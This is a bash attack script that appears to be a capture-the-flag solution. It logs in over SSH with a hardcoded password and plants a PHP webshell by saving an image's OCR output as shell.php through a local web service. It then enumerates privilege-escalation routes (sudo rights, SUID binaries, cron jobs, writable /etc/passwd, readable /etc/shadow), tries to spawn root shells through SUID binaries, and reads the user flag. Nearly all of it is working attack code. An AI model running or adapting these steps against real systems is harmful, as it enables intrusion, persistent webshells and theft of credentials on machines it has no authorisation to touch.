#!/bin/bash

if [ $# -ne 1 ]; then
    echo "Usage: $0 <target_ip>"
    exit 1
fi

TARGET=$1
PASSWORD="JbhHDAEgXvri3!"

echo "[+] Creating shell.png with PHP webshell (backup)..."
python3 -c "
from PIL import Image, ImageDraw, ImageFont
img = Image.new('RGB', (800, 100), (255,255,255))
d = ImageDraw.Draw(img)
try:
    font = ImageFont.truetype('/usr/share/fonts/truetype/dejavu/DejaVuSansMono-Bold.ttf', 28)
except:
    font = ImageFont.load_default()
d.text((10, 30), '<?php system(\$_GET[\"c\"]); ?>', fill=(0,0,0), font=font)
img.save('shell.png')
"

echo "[+] Uploading webshell to $TARGET..."
sshpass -p "$PASSWORD" scp shell.png "walter@$TARGET:/home/walter/"

echo "[+] Connecting via SSH and preparing webshell (non‑critical)..."
sshpass -p "$PASSWORD" ssh "walter@$TARGET" << 'ENDSSH_BACKUP'
    B64=$(base64 -w 0 ~/shell.png)
    OCR_ID=$(curl -s -c /tmp/jar -b /tmp/jar -X POST http://localhost:8001/ \
      -u 'walter:JbhHDAEgXvri3!' \
      --data-urlencode "canvas_image=data:image/png;base64,$B64" | \
      grep -oP 'ocr_id" value="\K[^"]+')
    curl -s -b /tmp/jar -X POST http://localhost:8001/ \
      -u 'walter:JbhHDAEgXvri3!' \
      --data "ocr_id=$OCR_ID&filename=shell.php&save_output=1" > /dev/null
    echo "[+] Webshell ready at http://localhost:8001/saved/shell.php"
ENDSSH_BACKUP

echo ""
echo "[+] ========== STARTING PRIVILEGE ESCALATION SCAN (via SSH) =========="
echo ""

# Use a single SSH session to run all enumeration and exploitation attempts
sshpass -p "$PASSWORD" ssh -t "walter@$TARGET" << 'ENDSSH'

    echo "[+] Current user: $(whoami)"
    echo "[+] User ID: $(id)"
    echo ""

    # ---- 1. Check sudo privileges ----
    echo "--- SUDO PERMISSIONS ---"
    sudo -l 2>/dev/null || echo "  (no sudo rights)"
    echo ""

    # ---- 2. Find SUID binaries ----
    echo "--- SUID BINARIES (interesting) ---"
    SUID_BINS=$(find / -perm -4000 -type f 2>/dev/null | grep -E 'find|python|perl|bash|sh|vim|nano|cp|mv|less|more|awk|sed|grep|tar|zip|unzip|openssl|chmod|chown|mount|umount|passwd|pkexec')
    if [ -z "$SUID_BINS" ]; then
        echo "  No interesting SUID binaries found."
    else
        echo "$SUID_BINS"
    fi
    echo ""

    # ---- 3. Check for world-writable files (cron, etc.) ----
    echo "--- WORLD-WRITABLE FILES (potential cron abuse) ---"
    find / -type f -perm -0002 -exec ls -l {} \; 2>/dev/null | grep -v '/proc/' | head -n 10
    echo ""

    # ---- 4. Check cron jobs ----
    echo "--- CRON JOBS (user & system) ---"
    crontab -l 2>/dev/null || echo "  No user crontab"
    ls -la /etc/cron* 2>/dev/null | grep -v '^total' | head -n 10
    echo ""

    # ---- 5. Check /etc/passwd for writability ----
    echo "--- /etc/passwd writable? ---"
    if [ -w /etc/passwd ]; then
        echo "  YES! You can add a root user."
    else
        echo "  No."
    fi
    echo ""

    # ---- 6. Check for other sensitive files ----
    echo "--- /etc/shadow readable? ---"
    if [ -r /etc/shadow ]; then
        echo "  YES! Hash might be crackable."
        grep root /etc/shadow 2>/dev/null || echo "  (root entry not found)"
    else
        echo "  No."
    fi
    echo ""

    # =====================================================================
    # NOW TRY TO GET A ROOT SHELL USING THE DISCOVERED SUID BINARIES
    # =====================================================================
    echo "[+] ========== ATTEMPTING TO SPAWN ROOT SHELL =========="

    # Helper function to try a command and keep shell open
    try_exploit() {
        local cmd="$1"
        echo "[*] Trying: $cmd"
        # Execute with -p to preserve privileges
        eval "$cmd" 2>/dev/null
        if [ $? -eq 0 ]; then
            echo "[+] Exploit seems to have worked! You should now be root."
            # Keep shell alive
            exec /bin/bash -i
        else
            echo "[-] Failed."
        fi
    }

    # Try each SUID binary in order of likelihood
    for bin in $SUID_BINS; do
        case "$bin" in
            */find)
                # find with -exec sh -p
                try_exploit "find /root -name root.txt -exec /bin/sh -p \;"
                ;;
            */python*)
                try_exploit "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash -p\")'"
                ;;
            */perl*)
                try_exploit "perl -e 'use POSIX (setuid); POSIX::setuid(0); exec \"/bin/bash -p\";'"
                ;;
            */bash|*/sh)
                # If bash/sh is SUID, just run with -p
                try_exploit "$bin -p"
                ;;
            */vim|*/nano|*/less|*/more)
                try_exploit "$bin /etc/shadow"  # then type :!sh or similar
                ;;
            */cp|*/mv)
                # Can't directly spawn shell, but could overwrite /etc/passwd – left for manual
                echo "[*] Skipping $bin (use manually if needed)"
                ;;
            *)
                # Generic attempt: run with -p if possible
                try_exploit "$bin -p 2>/dev/null"
                ;;
        esac
    done

    # If nothing worked, we still have the webshell – we can use it to upload a reverse shell
    echo ""
    echo "[!] Automated root shell attempts failed."
    echo "[!] However, you can manually exploit any SUID binary above or use the webshell."
    echo "[!] Webshell is at: http://localhost:8001/saved/shell.php?c=command"
    echo "[!] Example: curl 'http://localhost:8001/saved/shell.php?c=id' -u 'walter:JbhHDAEgXvri3!'"
    echo ""
    echo "--- USER FLAG (already available) ---"
    cat /home/walter/user.txt 2>/dev/null
    echo "-------------------------------------"
    echo ""
    echo "Press Ctrl+D to exit this SSH session."

    # Keep the session open so the user can manually interact
    exec /bin/bash -i

ENDSSH

echo ""
echo "[+] Cleaning up temporary files..."
rm -f shell.png
echo "[+] Done."
